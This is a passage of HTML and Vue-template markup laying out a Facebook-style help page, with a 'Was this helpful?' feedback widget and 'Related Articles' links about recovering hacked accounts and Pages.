                                                                      class="x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h"
                                                                      data-visualcompletion="ignore"
                                                                    ></div>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div>

                                                          

                                                              <!-- <div v-for="entry in conversation" :key="entry.text" class="chat-entry">
                                                                <div v-if="entry.type === 'question'"  class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x676frb x1lkfr7t x1lbecb7 xo1l8bm xzsf02u">{{ entry.text }}</div>
                                                                <div v-if="entry.type === 'answer'" class="answer">{{ entry.text }}</div>
                                                              </div> 
                                                              <div v-if="currentOptions.length > 0">
                                                                <button v-for="option in currentOptions" :key="option.value" @click="selectOption(option)" class="option-button">
                                                                  {{ option.label }}
                                                                </button>
                                                              </div> -->
                                                          <!-- here -->

                                                        </div>
                                                      </div>
                                                    </div>
                                                  </div>
                                                </div>
                                              </div>
                                              <div
                                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w"
                                              >
                                                <div
                                                  class="x1s85apg x4fpnxs xou9d7p xty2ufk"
                                                >
                                                  <div>
                                                    <div class="xhvchuf">
                                                      <div
                                                        class="x78zum5 x1n2onr6 xh8yej3"
                                                      >
                                                        <div
                                                          class="x9f619 x1n2onr6 x1ja2u2z x2bj2ny x1qpq9i9 xdney7k xu5ydu1 xt3gfkd xh8yej3 x6ikm8r x10wlt62 x10h3on"
                                                          style="
                                                            border-radius: max(
                                                                0px,
                                                                min(
                                                                  8px,
                                                                  (
                                                                      (
                                                                          100vw -
                                                                            4px
                                                                        ) - 100%
                                                                    ) * 9999
                                                                )
                                                              ) / 8px;
                                                          "
                                                        >
                                                          <fieldset
                                                            class="x6umtig x1b1mbwd xaqea5y xav7gou xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd"
                                                          >
                                                            <legend
                                                              class="x1dtb55y xexx8yu x4uap5 x18d9i69 xkhd6sd xh8yej3"
                                                            >
                                                              <div>
                                                                <div
                                                                  class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x6s0dn4 xozqiw3 x1q0g3np xn6708d x1ye3gou xyamay9 xykv574 xbmpl8g x4cne27 xifccgj"
                                                                >
                                                                  <div
                                                                    class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x193iq5w xeuugli x1r8uery x1iyjqo2 xs83m0k xsyo7zv x16hj40l x10b6aqq x1yrsyyn"
                                                                  >
                                                                    <div
                                                                      class="x78zum5 xdt5ytf xz62fqu x16ldp7u"
                                                                    >
                                                                      <div
                                                                        class="xu06os2 x1ok221b"
                                                                      >
                                                                        <span
                                                                          class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen x1s688f xzsf02u x1yc453h"
                                                                          dir="auto"
                                                                          ><span
                                                                            class="x1lliihq x6ikm8r x10wlt62 x1n2onr6"
                                                                            style="
                                                                              -webkit-box-orient: vertical;
                                                                              -webkit-line-clamp: 2;
                                                                              display: -webkit-box;
                                                                            "
                                                                            >Was
                                                                            this
                                                                            helpful?</span
                                                                          ></span
                                                                        >
                                                                      </div>
                                                                    </div>
                                                                  </div>
                                                                  <div
                                                                    class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xqcrz7y xsyo7zv x16hj40l x10b6aqq x1yrsyyn"
                                                                  >
                                                                    <div
                                                                      class="[object Object]"
                                                                    >
                                                                      <div
                                                                        aria-label="Dismiss"
                                                                        class="x1i10hfl x1qjc9v5 xjqpnuy xa49m3k xqeqjp1 x2hbi6w x9f619 x1ypdohk xdl72j9 x2lah0s xe8uvvx x2lwn1j xeuugli x16tdsg8 x1hl2dhg xggy1nq x1ja2u2z x1t137rt x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x1q0g3np x87ps6o x1lku1pv x1a2a7pz xjyslct xjbqb8w x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x972fbf xcfux6l x1qhh985 xm0m39n x3nfvp2 xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x3ajldb x194ut8o x1vzenxt xd7ygy7 xt298gk x1xhcax0 x1s928wv x10pfhc2 x1j6awrg x1v53gu8 x1tfg27r xitxdhh"
                                                                        role="button"
                                                                        tabindex="0"
                                                                      >
                                                                        <i
                                                                          data-visualcompletion="css-img"
                                                                          class="x1b0d499 x1d69dk1"
                                                                          style="
                                                                            background-image: url('https://static.xx.fbcdn.net/rsrc.php/v3/yM/r/PEImiUdDSfD.png');
                                                                            background-position: -108px -176px;
                                                                            background-size: 190px
                                                                              212px;
                                                                            width: 16px;
                                                                            height: 16px;
                                                                            background-repeat: no-repeat;
                                                                            display: inline-block;
                                                                          "
                                                                        ></i>
                                                                        <div
                                                                          class="x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h x14yjl9h xudhj91 x18nykt9 xww2gxu"
                                                                          data-visualcompletion="ignore"
                                                                        ></div>
                                                                      </div>
                                                                    </div>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </legend>
                                                            <div
                                                              class="x1yztbdb"
                                                            >
                                                              <div
                                                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x1r8uery x1iyjqo2 xs83m0k xeuugli xl56j7k x1qjc9v5 xozqiw3 x1q0g3np xn6708d x1ye3gou xyamay9 xykv574 xbmpl8g x4cne27 xifccgj"
                                                              >
                                                                <div
                                                                  class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x193iq5w xeuugli x1r8uery x1iyjqo2 xs83m0k xsyo7zv x16hj40l x10b6aqq x1yrsyyn"
                                                                >
                                                                  <div
                                                                    aria-label="Yes"
                                                                    class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x87ps6o x1lku1pv x1a2a7pz x9f619 x3nfvp2 xdt5ytf xl56j7k x1n2onr6 xh8yej3"
                                                                    role="button"
                                                                    tabindex="0"
                                                                  >
                                                                    <div
                                                                      class="x1n2onr6 x1ja2u2z x78zum5 x2lah0s xl56j7k x6s0dn4 xozqiw3 x1q0g3np xi112ho x17zwfj4 x585lrc x1403ito x972fbf xcfux6l x1qhh985 xm0m39n x9f619 xn6708d x1ye3gou x1qhmfi1 x1fq8qgq"
                                                                    >
                                                                      <div
                                                                        class="x6s0dn4 x78zum5 xl56j7k x1608yet xljgi0e x1e0frkt"
                                                                      >
                                                                        <div
                                                                          class="x9f619 x1n2onr6 x1ja2u2z x193iq5w xeuugli x6s0dn4 x78zum5 x2lah0s x1fbi1t2 xl8fo4v"
                                                                        >
                                                                          <i
                                                                            data-visualcompletion="css-img"
                                                                            class="x1b0d499 xep6ejk"
                                                                            style="
                                                                              background-image: url('https://static.xx.fbcdn.net/rsrc.php/v3/yG/r/vkwRKTKnUjC.png');
                                                                              background-position: 0px -7564px;
                                                                              background-size: 34px
                                                                                7600px;
                                                                              width: 16px;
                                                                              height: 16px;
                                                                              background-repeat: no-repeat;
                                                                              display: inline-block;
                                                                            "
                                                                          ></i>
                                                                        </div>
                                                                        <div
                                                                          class="x9f619 x1n2onr6 x1ja2u2z x193iq5w xeuugli x6s0dn4 x78zum5 x2lah0s x1fbi1t2 xl8fo4v"
                                                                        >
                                                                          <span
                                                                            class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x1lkfr7t x1lbecb7 x1s688f x1dem4cn"
                                                                            dir="auto"
                                                                            ><span
                                                                              class="x1lliihq x6ikm8r x10wlt62 x1n2onr6 xlyipyv xuxw1ft x1j85h84"
                                                                              >Yes</span
                                                                            ></span
                                                                          >
                                                                        </div>
                                                                      </div>
                                                                      <div
                                                                        class="x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h"
                                                                        data-visualcompletion="ignore"
                                                                      ></div>
                                                                    </div>
                                                                  </div>
                                                                </div>
                                                                <div
                                                                  class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x193iq5w xeuugli x1r8uery x1iyjqo2 xs83m0k xsyo7zv x16hj40l x10b6aqq x1yrsyyn"
                                                                >
                                                                  <div
                                                                    aria-label="No"
                                                                    class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x87ps6o x1lku1pv x1a2a7pz x9f619 x3nfvp2 xdt5ytf xl56j7k x1n2onr6 xh8yej3"
                                                                    role="button"
                                                                    tabindex="0"
                                                                  >
                                                                    <div
                                                                      class="x1n2onr6 x1ja2u2z x78zum5 x2lah0s xl56j7k x6s0dn4 xozqiw3 x1q0g3np xi112ho x17zwfj4 x585lrc x1403ito x972fbf xcfux6l x1qhh985 xm0m39n x9f619 xn6708d x1ye3gou x1qhmfi1 x1fq8qgq"
                                                                    >
                                                                      <div
                                                                        class="x6s0dn4 x78zum5 xl56j7k x1608yet xljgi0e x1e0frkt"
                                                                      >
                                                                        <div
                                                                          class="x9f619 x1n2onr6 x1ja2u2z x193iq5w xeuugli x6s0dn4 x78zum5 x2lah0s x1fbi1t2 xl8fo4v"
                                                                        >
                                                                          <i
                                                                            data-visualcompletion="css-img"
                                                                            class="x1b0d499 xep6ejk"
                                                                            style="
                                                                              background-image: url('https://static.xx.fbcdn.net/rsrc.php/v3/yG/r/vkwRKTKnUjC.png');
                                                                              background-position: 0px -7546px;
                                                                              background-size: 34px
                                                                                7600px;
                                                                              width: 16px;
                                                                              height: 16px;
                                                                              background-repeat: no-repeat;
                                                                              display: inline-block;
                                                                            "
                                                                          ></i>
                                                                        </div>
                                                                        <div
                                                                          class="x9f619 x1n2onr6 x1ja2u2z x193iq5w xeuugli x6s0dn4 x78zum5 x2lah0s x1fbi1t2 xl8fo4v"
                                                                        >
                                                                          <span
                                                                            class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x1lkfr7t x1lbecb7 x1s688f x1dem4cn"
                                                                            dir="auto"
                                                                            ><span
                                                                              class="x1lliihq x6ikm8r x10wlt62 x1n2onr6 xlyipyv xuxw1ft x1j85h84"
                                                                              >No</span
                                                                            ></span
                                                                          >
                                                                        </div>
                                                                      </div>
                                                                      <div
                                                                        class="x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h"
                                                                        data-visualcompletion="ignore"
                                                                      ></div>
                                                                    </div>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </fieldset>
                                                        </div>
                                                      </div>
                                                    </div>
                                                  </div>
                                                </div>
                                              </div>
                                              <div
                                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w"
                                              >
                                                <div class="x1daaz14">
                                                  <div
                                                    @click="outsideAlert()"
                                                    id="Related Articles"
                                                    class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w xzg4506 x1sgudl8 x4i7bpe"
                                                  >
                                                    <div
                                                      class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"
                                                    >
                                                      <div
                                                        class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1xmf6yo x1e56ztr xzboxd6 x14l7nz5"
                                                      >
                                                        <h2
                                                          class="x1heor9g x1qlqyl8 x1pd3egz x1a2a7pz"
                                                          dir="auto"
                                                        >
                                                          <span
                                                            class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xtoi2st x3x7a5m x1603h9y x1u7k74 x1xlr1w8 xzsf02u"
                                                            dir="auto"
                                                            >Related
                                                            Articles</span
                                                          >
                                                        </h2>
                                                      </div>
                                                      <div
                                                        class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xz9dl7a x1xmf6yo x1e56ztr xzboxd6 x14l7nz5"
                                                      >
                                                        <div
                                                          class=""
                                                          role="list"
                                                        >
                                                          <div
                                                            role="listitem"
                                                            class="x9f619 x1n2onr6 x1ja2u2z x1qjc9v5 x78zum5 xdt5ytf x1iyjqo2 xl56j7k xeuugli xjkvuk6 x1iorvi4 xykv574 xbmpl8g x4cne27 xifccgj"
                                                          >
                                                            <div
                                                              class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x6s0dn4 xozqiw3 x1q0g3np"
                                                            >
                                                              <div
                                                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x1iyjqo2 xs83m0k xeuugli x1qughib x6s0dn4 x1a02dak x1q0g3np xdl72j9"
                                                              >
                                                                <div
                                                                  class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1iyjqo2"
                                                                >
                                                                  <div
                                                                    class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xsyo7zv x16hj40l x10b6aqq x1yrsyyn"
                                                                  >
                                                                    <div
                                                                      class="x78zum5 xdt5ytf xz62fqu x16ldp7u"
                                                                    >
                                                                      <div
                                                                        class="xu06os2 x1ok221b"
                                                                      >
                                                                        <span
                                                                          class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa x1yc453h"
                                                                          dir="auto"
                                                                          ><span
                                                                            class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 x1s688f xzsf02u"
                                                                            ><a
                                                                              class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1ypdohk xt0psk2 xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz xt0b8zv x1qq9wsj x1s688f"
                                                                              role="link"
                                                                              tabindex="0"
                                                                            >
                                                                              I
                                                                              think
                                                                              my
                                                                              Facebook
                                                                              Page
                                                                              was
                                                                              hacked
                                                                              or
                                                                              taken
                                                                              over
                                                                              by
                                                                              someone
                                                                              else.</a
                                                                            ></span
                                                                          ></span
                                                                        >
                                                                      </div>
                                                                    </div>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div>
                                                          <div
                                                            role="listitem"
                                                            class="x9f619 x1n2onr6 x1ja2u2z x1qjc9v5 x78zum5 xdt5ytf x1iyjqo2 xl56j7k xeuugli xjkvuk6 x1iorvi4 xykv574 xbmpl8g x4cne27 xifccgj"
                                                          >
                                                            <div
                                                              class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x6s0dn4 xozqiw3 x1q0g3np"
                                                            >
                                                              <div
                                                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x1iyjqo2 xs83m0k xeuugli x1qughib x6s0dn4 x1a02dak x1q0g3np xdl72j9"
                                                              >
                                                                <div
                                                                  class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1iyjqo2"
                                                                >
                                                                  <div
                                                                    class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xsyo7zv x16hj40l x10b6aqq x1yrsyyn"
                                                                  >
                                                                    <div
                                                                      class="x78zum5 xdt5ytf xz62fqu x16ldp7u"
                                                                    >
                                                                      <div
                                                                        class="xu06os2 x1ok221b"
                                                                      >
                                                                        <span
                                                                          class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa x1yc453h"
                                                                          dir="auto"
                                                                          ><span
                                                                            class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 x1s688f xzsf02u"
                                                                            ><a
                                                                              class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1ypdohk xt0psk2 xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz xt0b8zv x1qq9wsj x1s688f"
                                                                              role="link"
                                                                              tabindex="0"
                                                                              >Recover
                                                                              Your
                                                                              Account
                                                                              if
                                                                              You
                                                                              Think
                                                                              Your
                                                                              Facebook
                                                                              Account
                                                                              Was
                                                                              Hacked
                                                                              or
                                                                              if
                                                                              Someone
                                                                              Is
                                                                              Using
                                                                              It
                                                                              Without
                                                                              Your
                                                                              Permission</a
                                                                            ></span
                                                                          ></span
                                                                        >
                                                                      </div>
                                                                    </div>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div>
                                                          <div
                                                            role="listitem"
                                                            class="x9f619 x1n2onr6 x1ja2u2z x1qjc9v5 x78zum5 xdt5ytf x1iyjqo2 xl56j7k xeuugli xjkvuk6 x1iorvi4 xykv574 xbmpl8g x4cne27 xifccgj"
                                                          >
                                                            <div
                                                              class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x6s0dn4 xozqiw3 x1q0g3np"
                                                            >
                                                              <div
                                                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x1iyjqo2 xs83m0k xeuugli x1qughib x6s0dn4 x1a02dak x1q0g3np xdl72j9"
                                                              >
                                                                <div
                                                                  class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1iyjqo2"
                                                                >
                                                                  <div
                                                                    class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xsyo7zv x16hj40l x10b6aqq x1yrsyyn"
                                                                  >
                                                                    <div
                                                                      class="x78zum5 xdt5ytf xz62fqu x16ldp7u"
                                                                    >
                                                                      <div
                                                                        class="xu06os2 x1ok221b"
                                                                      >
                                                                        <span
                                                                          class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa x1yc453h"
                                                                          dir="auto"
                                                                          ><span
                                                                            class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 x1s688f xzsf02u"
                                                                            ><a
                                                                              class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1ypdohk xt0psk2 xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz xt0b8zv x1qq9wsj x1s688f"
                                                                              role="link"
                                                                              tabindex="0"
                                                                              >Help
                                                                              your
                                                                              friend
                                                                              recover
                                                                              their
                                                                              hacked
                                                                              Facebook
                                                                              account</a
                                                                            ></span
                                                                          ></span
                                                                        >
                                                                      </div>
                                                                    </div>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div>
                                                          <div
                                                            role="listitem"
                                                            class="x9f619 x1n2onr6 x1ja2u2z x1qjc9v5 x78zum5 xdt5ytf x1iyjqo2 xl56j7k xeuugli xjkvuk6 x1iorvi4 xykv574 xbmpl8g x4cne27 xifccgj"
                                                          >
                                                            <div
                                                              class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x6s0dn4 xozqiw3 x1q0g3np"
                                                            >
                                                              <div
                                                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x1iyjqo2 xs83m0k xeuugli x1qughib x6s0dn4 x1a02dak x1q0g3np xdl72j9"
                                                              >
                                                                <div
                                                                  class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1iyjqo2"
                                                                >
                                                                  <div
                                                                    class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xsyo7zv x16hj40l x10b6aqq x1yrsyyn"
                                                                  >
                                                                    <div
                                                                      class="x78zum5 xdt5ytf xz62fqu x16ldp7u"
                                                                    >
                                                                      <div
                                                                        class="xu06os2 x1ok221b"
                                                                      >
                                                                        <span
                                                                          class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa x1yc453h"
                                                                          dir="auto"
                                                                          ><span
                                                                            class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 x1s688f xzsf02u"
                                                                            ><a
                                                                              class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1ypdohk xt0psk2 xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz xt0b8zv x1qq9wsj x1s688f"
                                                                              role="link"
                                                                              tabindex="0"
                                                                              >Hacked
                                                                              and
                                                                              Fake
                                                                              Accounts</a
                                                                            ></span
                                                                          ></span
                                                                        >
                                                                      </div>
                                                                    </div>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div>
                                                        </div>
                                                      </div>
                                                    </div>
                                                  </div>
                                                </div>
                                                <div
                                                  class="x1s85apg xqupn85 xwn1f64"
                                                >
                                                  <div
                                                    class="x78zum5 x1n2onr6 xh8yej3"
                                                  >
                                                    <div
                                                      class="x9f619 x1n2onr6 x1ja2u2z x2bj2ny x1qpq9i9 xdney7k xu5ydu1 xt3gfkd xh8yej3 x6ikm8r x10wlt62 x10h3on"
                                                      style="
                                                        border-radius: max(
                                                            0px,
                                                            min(
                                                              8px,
                                                              (
                                                                  (100vw - 4px) -
                                                                    100%
                                                                ) * 9999
                                                            )
                                                          ) / 8px;
                                                      "
                                                    >
                                                      <div
                                                        id="Related Articles"
                                                        class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w x1l90r2v x1swvt13 x1pi30zi x1y1aw1k"
                                                      >
                                                        <div
                                                          class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"
                                                        >
                                                          <div
                                                            class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w"
                                                          >
                                                            <div
                                                              data-visualcompletion="ignore-dynamic"
                                                              style="
                                                                padding-left: 8px;
                                                                padding-right: 8px;
                                                              "
                                                            >
                                                              <div
                                                                class="x1lq5wgf xgqcy7u x30kzoy x9jhf4c x1lliihq"
                                                              >
                                                                <div
                                                                  class="x6s0dn4 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r xeuugli x18d9i69 x1sxyh0 xurb0ha xexx8yu x1n2onr6 x1ja2u2z x1gg8mnh"
                                                                >
                                                                  <div
                                                                    class="x78zum5 xdt5ytf xq8finb x1xmf6yo x1e56ztr x1n2onr6 xqcrz7y"
                                                                  >
                                                                    <div
                                                                      class="x14yjl9h xudhj91 x18nykt9 xww2gxu x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x3nfvp2 xl56j7k x1n2onr6 x1qhmfi1 xc9qbxq x14qfxbe"
                                                                    >
                                                                      <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" aria-hidden="true" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/yr/r/X12x-LHqySt.png&quot;); background-position: 0px -3276px; background-size: auto; width: 24px; height: 24px; background-repeat: no-repeat; display: inline-block;"></i>
                                                                    </div>
                                                                  </div>
                                                                  <div
                                                                    class="x6s0dn4 xkh2ocl x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x18d9i69 x4uap5 xkhd6sd xexx8yu x1n2onr6 x1ja2u2z"
                                                                  >
                                                                    <div
                                                                      class="x1qjc9v5 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x4uap5 xkhd6sd xz9dl7a xsag5q8 x1n2onr6 x1ja2u2z"
                                                                    >
                                                                      <div
                                                                        class=""
                                                                      >
                                                                        <div
                                                                          class="x78zum5 xdt5ytf xz62fqu x16ldp7u"
                                                                        >
                                                                          <div
                                                                            class="xu06os2 x1ok221b"
                                                                          >
                                                                            <span
                                                                              class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x676frb x1lkfr7t x1lbecb7 xk50ysn xzsf02u x1yc453h"
                                                                              dir="auto"
                                                                              ><span
                                                                                class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1603h9y x1u7k74 x1xlr1w8 xzsf02u"
                                                                                >Related
                                                                                Articles</span
                                                                              ></span
                                                                            >
                                                                          </div>
                                                                        </div>
                                                                      </div>
                                                                    </div>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div>
                                                          <div
                                                            class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w"
                                                          >
                                                            <div
                                                              aria-label="Related Articles"
                                                              role="list"
                                                              class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w"
                                                            >
                                                              <div
                                                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"
                                                              >
                                                                <div
                                                                  aria-labelledby=" I think my Facebook Page was hacked or taken over by someone else."
                                                                  role="listitem"
                                                                  class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w"
                                                                >
                                                                  <div
                                                                    data-visualcompletion="ignore-dynamic"
                                                                    style="
                                                                      padding-left: 8px;
                                                                      padding-right: 8px;
                                                                    "
                                                                  >
                                                                    <a
                                                                      class="x1i10hfl x1qjc9v5 xjbqb8w xjqpnuy xa49m3k xqeqjp1 x2hbi6w x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xdl72j9 x2lah0s xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x2lwn1j xeuugli xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x16tdsg8 x1hl2dhg xggy1nq x1ja2u2z x1t137rt x1q0g3np x87ps6o x1lku1pv x1a2a7pz x1lq5wgf xgqcy7u x30kzoy x9jhf4c x1lliihq"
                                                                      role="link"
                                                                      tabindex="0"
                                                                    >
                                                                      <div
                                                                        class="x6s0dn4 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r xeuugli x18d9i69 x1sxyh0 xurb0ha xexx8yu x1n2onr6 x1ja2u2z x1gg8mnh"
                                                                      >
                                                                        <div
                                                                          class="x6s0dn4 xkh2ocl x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x18d9i69 x4uap5 xkhd6sd xexx8yu x1n2onr6 x1ja2u2z"
                                                                        >
                                                                          <div
